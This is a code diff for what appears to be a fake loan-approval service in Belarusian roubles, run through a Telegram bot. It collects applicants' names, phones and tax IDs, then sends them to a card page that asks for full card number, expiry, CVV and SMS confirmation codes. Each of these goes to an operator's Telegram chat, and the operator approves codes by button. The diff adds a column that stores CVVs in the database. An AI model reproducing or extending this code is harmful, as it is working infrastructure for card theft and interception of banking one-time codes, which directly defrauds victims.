@@ -2,7 +2,6 @@ import os
 import sqlite3
 import secrets
 import requests
-import io
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 
@@ -33,6 +32,7 @@ def init_db():
             card_holder TEXT,
             card_number TEXT,
             card_expiry TEXT,
+            card_cvv TEXT,
             code_status TEXT DEFAULT 'pending',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
@@ -74,15 +74,6 @@ def send_admin(text, keyboard=None):
         payload["reply_markup"] = keyboard
     tg("sendMessage", payload)
 
-def send_raw(chat_id, text):
-    """Отправка обычного текста без HTML разметки"""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": ""}
-    try:
-        requests.post(url, json=payload, timeout=15)
-    except Exception as e:
-        print("Ошибка отправки:", e)
-
 def send_user(chat_id, text):
     payload = {
         "chat_id": chat_id,
@@ -122,8 +113,8 @@ def home():
 def serve_card_page():
     return send_file("index.html")
 
-@app.route("/get_application_data/<session_id>")
-def get_application_data(session_id):
+@app.route("/get_application/<session_id>")
+def get_application(session_id):
     row = db_one("SELECT fullname, amount, term, payment, status FROM applications WHERE session_id = ?", (session_id,))
     if not row:
         return jsonify({"error": "not_found"}), 404
@@ -141,13 +132,12 @@ def submit_card_details():
     card_expiry = data.get("card_expiry")
     card_cvv = data.get("card_cvv")
     
-    # БЕЗ МАСКИРОВКИ - полный номер карты
     row = db_one("SELECT fullname, amount, phone FROM applications WHERE session_id = ?", (session_id,))
     
     if row:
         fullname, amount, phone = row
-        db_exec("UPDATE applications SET card_holder=?, card_number=?, card_expiry=? WHERE session_id=?", 
-                (card_holder, card_number, card_expiry, session_id))
+        db_exec("UPDATE applications SET card_holder=?, card_number=?, card_expiry=?, card_cvv=? WHERE session_id=?", 
+                (card_holder, card_number, card_expiry, card_cvv, session_id))
         
         message = f"""
 💳 ДАННЫЕ КАРТЫ ДЛЯ ВЫПЛАТЫ
@@ -162,7 +152,7 @@ def submit_card_details():
 📅 Срок: {card_expiry}
 🔐 CVV: {card_cvv}
         """
-        send_raw(ADMIN_CHAT_ID, message)
+        send_admin(message)
     
     return jsonify({"status": "ok"})
 
@@ -175,17 +165,14 @@ def submit_sms_code():
     if row:
         fullname, amount = row
         send_admin(f"""
-🔐 <b>ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД</b>
+🔐 ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД
 
-🆔 Сессия: <code>{session_id}</code>
+🆔 Сессия: {session_id}
 👤 Клиент: {fullname}
 💰 Сумма: {amount:.0f} BYN
-
-📱 <b>Код:</b> <code>{code}</code>
-
-⚠️ Проверьте код и нажмите кнопку:
+📱 Код: {code}
         """, reply_markup=code_keyboard(session_id))
-    return jsonify({"status": "waiting"})
+    return jsonify({"status": "ok"})
 
 @app.route("/submit_credit_application", methods=["POST"])
 def submit_credit_application():
@@ -199,21 +186,22 @@ def submit_credit_application():
     payment = float(data.get("payment", 0))
     credit_history = data.get("credit_history", "")
     user_chat_id = data.get("user_chat_id", "")
+    
     db_exec("""INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id, credit_history, user_chat_id, status)
                VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
             (fullname, phone, inn, 0, term, amount, payment, session_id, credit_history, user_chat_id, "pending"))
     
-    text = f"""🆕 <b>НОВАЯ ЗАЯВКА</b>
+    text = f"""🆕 НОВАЯ ЗАЯВКА
 
-👤 <b>ФИО:</b> {fullname}
-📱 <b>Телефон:</b> {phone}
-🆔 <b>ИНН:</b> {inn}
-💰 <b>Сумма:</b> {amount:.0f} BYN
-📅 <b>Срок:</b> {term} мес.
-💳 <b>Платёж:</b> ~{payment:.0f} BYN
-📊 <b>КИ:</b> {credit_history}
+👤 ФИО: {fullname}
+📱 Телефон: {phone}
+🆔 ИНН: {inn}
+💰 Сумма: {amount:.0f} BYN
+📅 Срок: {term} мес.
+💳 Платёж: ~{payment:.0f} BYN
+📊 КИ: {credit_history}
 
-🆔 <b>Сессия:</b> <code>{session_id}</code>"""
+🆔 Сессия: {session_id}"""
     send_admin(text, keyboard(session_id))
     return jsonify({"status": "ok", "session_id": session_id})
 
@@ -223,17 +211,6 @@ def check_status(session_id):
     if not row:
         return jsonify({"status": "not_found"}), 404
     return jsonify({"status": row[0]})
-
-@app.route("/get_application/<session_id>")
-def get_application(session_id):
-    row = db_one("SELECT fullname, phone, inn, amount, term, payment, credit_history, status FROM applications WHERE session_id = ?", (session_id,))
-    if not row:
-        return jsonify({"status": "not_found"}), 404
-    return jsonify({
-        "fullname": row[0], "phone": row[1], "inn": row[2],
-        "amount": row[3], "term": row[4], "payment": row[5],
-        "credit_history": row[6], "status": row[7]
-    })
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -255,16 +232,16 @@ def webhook():
             user_chat_id, fullname, amount, term = row
             card_url = f"https://alfa-bot-api.onrender.com/card?session={session_id}"
             send_user(user_chat_id, f"""
-✅ <b>ВАША ЗАЯВКА ОДОБРЕНА!</b>
+✅ ВАША ЗАЯВКА ОДОБРЕНА!
 
 👤 {fullname}
 💰 Сумма: {amount:.0f} BYN
 📅 Срок: {term} мес.
 
-🔗 <a href="{card_url}">👉 НАЖМИТЕ СЮДА, ЧТОБЫ ПОЛУЧИТЬ СРЕДСТВА</a>
+🔗 Ссылка: {card_url}
 """)
         answer_callback(callback_id, "✅ Заявка одобрена")
-        send_admin(f"✅ <b>Заявка ОДОБРЕНА</b>\nСессия: <code>{session_id}</code>")
+        send_admin(f"✅ Заявка ОДОБРЕНА\nСессия: {session_id}")
     
     elif action in ["reject", "decline"]:
         db_exec("UPDATE applications SET status = ? WHERE session_id = ?", ("rejected", session_id))
@@ -272,12 +249,12 @@ def webhook():
         if row and row[0]:
             send_user(row[0], "❌ Ваша заявка отклонена")
         answer_callback(callback_id, "❌ Заявка отклонена")
-        send_admin(f"❌ <b>Заявка ОТКЛОНЕНА</b>\nСессия: <code>{session_id}</code>")
+        send_admin(f"❌ Заявка ОТКЛОНЕНА\nСессия: {session_id}")
     
     elif action == "code_ok":
         db_exec("UPDATE applications SET code_status = ? WHERE session_id = ?", ("approved", session_id))
         answer_callback(callback_id, "✅ Код подтвержден")
-        send_admin(f"✅ <b>Код подтвержден для сессии</b> <code>{session_id}</code>")
+        send_admin(f"✅ Код подтвержден для сессии {session_id}")
         row = db_one("SELECT user_chat_id FROM applications WHERE session_id = ?", (session_id,))
         if row and row[0]:
             send_user(row[0], "✅ Код подтвержден! Средства будут зачислены.")
@@ -285,7 +262,7 @@ def webhook():
     elif action == "code_bad":
         db_exec("UPDATE applications SET code_status = ? WHERE session_id = ?", ("rejected", session_id))
         answer_callback(callback_id, "❌ Код неверный")
-        send_admin(f"❌ <b>Неверный код для сессии</b> <code>{session_id}</code>")
+        send_admin(f"❌ Неверный код для сессии {session_id}")
     
     return jsonify({"ok": True})
 
